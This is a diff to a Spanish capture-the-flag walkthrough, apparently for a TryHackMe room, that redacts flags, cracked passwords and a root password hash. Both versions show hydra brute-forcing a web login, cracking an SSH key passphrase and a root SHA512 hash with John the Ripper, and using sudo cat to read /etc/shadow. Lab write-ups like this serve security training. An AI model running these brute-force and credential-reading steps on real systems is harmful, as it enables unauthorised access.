@@ -26,7 +26,7 @@ ___
 	* Sabiendo que el usuario de la web app es `admin` pasamos a crackear la contraseña de dicho usuario web:
     	* `hydra -l admin -P ../rockyou.txt [IP] http-post-form "/admin/index.php:user=admin&pass=^PASS^:Username or password invalid" -v -t 64`
 
-		* Encontramos que las credenciales son `admin:xavier`. Tambien, la **Web Flag** es `THM{brut3_f0rce_is_e4sy}`.
+		* Encontramos que las credenciales son `admin:******`. Tambien, la **Web Flag**.
 
 * Sistema:
 	* Hacemos click en el enlace para obtener la Clave Privada del usuario del sistema, que parece ser `john`. Nos lleva a dicho recurso, el cual pasamos a descargar con:
@@ -35,7 +35,7 @@ ___
     	* `chmod 600 id_rsa` (le damos permisos 600)
         * `ssh2john id_rsa > id_rsa.hash` (la convertimos a hash)
         * `john --wordlist=<rockyou.txt> id_rsa.hash` (crackeamos)
-        * `id_rsa:rockinroll`
+        * `id_rsa:<passphrase>`
         * `(john --show id_rsa.hash)` (recuperamos el resultado)
 	 
     * Ahora vamos a intentar loguearnos:
@@ -46,28 +46,30 @@ ___
 ___
 
 #### FASE POST-EXPLOTACIÓN (Escalar Privilegios):
-Primero obtenemos la `User Flag`:
-	* `cat user.txt` ==> `THM{a_password_is_not_a_barrier}`
+Primero obtenemos la `User Flag` con:  
+* `cat user.txt`
+> `<user_flag>`
 
-Apenas tenemos **Footholding del Sistema**, una de las primeras cosas para _Elevar Privilegios_ es buscar **Privilegios Sudo**. Lo chequeamos con `sudo -l`:
+Apenas tenemos **Footholding del Sistema**, una de las primeras cosas para _Elevar Privilegios_ es buscar **Privilegios Sudo**. Lo chequeamos con `sudo -l`:  
+> (root) NOPASSWD: /bin/cat
+>> Esto nos permite **Leer Ficheros como Root sin Contraseña**.
 
-* (root) NOPASSWD: /bin/cat
+Vamos a verificar si es una posible _Explotación Sudo_ con dicho binario. Navegamos a [GTFOBins](https://gtfobins.github.io/) y terminamos corriendo: `sudo -u root /bin/cat /etc/shadow`. Nos devuelve el contenido de `/etc/shadow`!  
 
-Esto nos permitiría poder leer ficheros como root. Por lo cual, vamos a verificarsi enemos una posible _Explotación Sudo_. Vamos a [GTFOBins](https://gtfobins.github.io/) y terminamos corriendo: `sudo -u root /bin/cat /etc/shadow`.
+Identificamos la línea que nos importa:
+> `root:<hash>`
 
-Nos devuelve el contenido de `/etc/shadow` y vemos la línea que nos importa:
+Consultando a la IA, por ejemplo, nos damos cuenta que trata de un hash _SHA512_. Debemos usar nuevamente John the Ripper. Creamos un fichero de texto plano que contenga toda la línea correspondiente a root: `nano shadow.txt`. Le pegamos toda la línea.
 
-> `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.`
+Ahora crackeamos la pass con: 
+* `john -wordlist=[rockyou.txt] shadow.txt`
 
-Consultando a la IA, por ejemplo nos damos cuenta que trata de un hash _SHA512_, por lo cual tendremos que usar nuevamente John the Ripper para resolver. Creamos un fichero que contenga toda la línea correspondiente a root con: `nano shadow.txt`.
+Obtenemos `root:********`. Si la queremos recuperar:
+* `john --show shadow.txt`             
 
-> Le pasamos entonces: `root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::`
+Probamos logueo con `su -`, le damos la pass y somos root!
 
-Ahora vamos a crackear la con: `john -wordlist=[rockyou.txt] shadow.txt`. Nos devuelve `root:football`. Si queremos recuperarla hacemos `john --show shadow.txt`.             
-
-Bien, ahora que tenos la contraseña, vamos a probarla. Hacemos `su -` y le damos `football`. Somos root!
-
-Ahora leemos la _Root Flag_ con `cat root.txt`. Obtenemos `THM{pr1v1l3g3_3sc4l4t10n}`. Eso es todo.
+Ahora leemos la _Root Flag_ con `cat root.txt`. Eso es todo.
 
 ___
 
